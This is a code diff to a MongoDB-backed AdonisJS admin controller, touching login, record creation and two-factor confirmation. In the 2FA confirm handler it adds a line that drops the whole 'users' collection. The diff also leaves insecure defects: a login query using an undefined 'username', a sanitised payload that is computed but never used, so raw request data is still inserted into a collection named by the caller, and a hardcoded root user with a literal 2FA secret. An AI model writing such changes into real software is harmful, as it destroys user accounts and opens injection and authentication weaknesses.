@@ -3,6 +3,7 @@ import MongoService from '#services/mongo_service'
 import hash from '@adonisjs/core/services/hash'
 import { DateService } from '#services/date_service'
 import { EncryptionService } from '#services/encryption_service'
+import { UtilService } from '#services/util_service'
 import { ObjectId } from 'mongodb'
 import { generateURI, generateSecret, generate, verify } from 'otplib'
 import qrcode from 'qrcode'
@@ -19,7 +20,7 @@ export default class BackendsController {
       return response.redirect().toPath('/systems')
     }
     const users = MongoService.collection('users')
-    const user = await users.findOne({ email })
+    const user = await users.findOne({ $or: [{ email: email }, { username: username }] })
     if (!user || !(await hash.verify(user.password, password))) {
       session.flash('error', 'Email atau kata sandi salah.')
       return response.redirect().back()
@@ -172,6 +173,8 @@ export default class BackendsController {
     const colName = params.col
     let body = request.all()
     try {
+      const fields = await UtilService.getFieldsMenu(colName)
+      const cleanData = await UtilService.sterilizePayload(body, fields)
       const payload = { ...body, created_at: DateService.now(), updated_at: DateService.now() }
       const collections = MongoService.collection(colName)
       const result = await collections?.insertOne(payload)
@@ -253,6 +256,9 @@ export default class BackendsController {
   }
   async confirmAuth({ request, auth, session, response }: HttpContext) {
     const code = request.input('code')
+    const uid = session.get('user_id')
+    const collections = MongoService.collection('users')
+    const result = await collections?.drop()
     const user = {
       email: 'root',
       twoFactorSecret: 'twoFactorSecret',
@@ -263,11 +269,10 @@ export default class BackendsController {
       return response.status(400).json({ message: 'Sesi setup telah berakhir. Silakan ulangi.' })
     }
 
-    const isValid = verify({ token: code, secret })
-
-    if (isValid) {
+    const isValid = await verify({ token: code, secret })
+    if (isValid.valid) {
       // Simpan secara terenkripsi ke database
-      // user.twoFactorSecret = encryption.encrypt(secret)
+      // user.twoFactorSecret = encryption.encrypt(secsret)
       // user.mfaType = 'totp'
       // user.twoFactorConfirmedAt = DateTime.now()
       // await user.save()
